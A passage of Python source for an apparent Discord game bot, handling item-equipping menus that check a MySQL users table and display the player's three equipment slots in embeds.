                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Standard Shield equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'SS' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Iron Helmet':
            # checks whether player has hd
            mycursor.execute("SELECT ih FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have an Iron Helmet...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "IH" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have an Iron Helmet equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'IH' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Platinum Armour':
            # checks whether player has hd
            mycursor.execute("SELECT pa FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have Platinum Armour...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "PA" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have Platinum Armour equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'PA' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Rune Necklace':
            # checks whether player has hd
            mycursor.execute("SELECT rn FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Rune Necklace...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "RN" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Rune Necklace equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'RN' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Mystic Artifact':
            # checks whether player has hd
            mycursor.execute("SELECT ma FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Mystic Artifact...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "MA" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Mystic Artifact equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'MA' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Enchanted Headpiece':
            # checks whether player has hd
            mycursor.execute("SELECT eh FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have an Enchanted Headpiece...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "EH" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have an Enchanted Headpiece equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'EH' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Vital Vial':
            # checks whether player has hd
            mycursor.execute("SELECT vv FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Vital Vial...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "VV" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Vital Vial equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'VV' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Deathspike':
            # checks whether player has hd
            mycursor.execute("SELECT d FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have an Deathspike...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "D" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Deathspike equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'D' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Tea Bag':
            # checks whether player has hd
            mycursor.execute("SELECT tb FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Tea Bag...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "TB" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
